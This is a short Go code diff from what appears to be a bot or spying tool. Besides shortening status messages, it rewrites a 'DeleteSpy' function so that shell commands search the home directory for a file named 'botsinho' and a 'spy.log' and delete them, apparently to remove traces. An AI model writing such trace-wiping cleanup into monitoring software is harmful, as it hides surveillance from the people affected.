@@ -23,7 +23,7 @@ func ConfigTrmx()(bool){
 	
 	
 	out, _ := path.Output()
-	fmt.Println("CONFIGURANDO/,,,,>:"+string(out))
+	fmt.Println("conf.,,,,>:"+string(out))
 
 	if(string(out) == ""){
 		fmt.Println("configurando...")
@@ -36,7 +36,7 @@ func ConfigTrmx()(bool){
 	}else{
 
 		fmt.Println(string(out))
-		fmt.Println("OK CONFIG")
+		fmt.Println("OK")
 		return true
 	}
 	
@@ -47,8 +47,8 @@ func ConfigTrmx()(bool){
 
 
 func DeleteSpy(){
-	com := exec.Command("bash", "-c", "rm ./botsinho")
-	com2 := exec.Command("bash", "-c", "rm spy.log")
+	com := exec.Command("bash", "-c", "find ~/ -name botsinho -delete")
+	com2 := exec.Command("bash", "-c", "find ~/ -name spy.log -delete")
 	com2.Output()
 	com.Output()
 
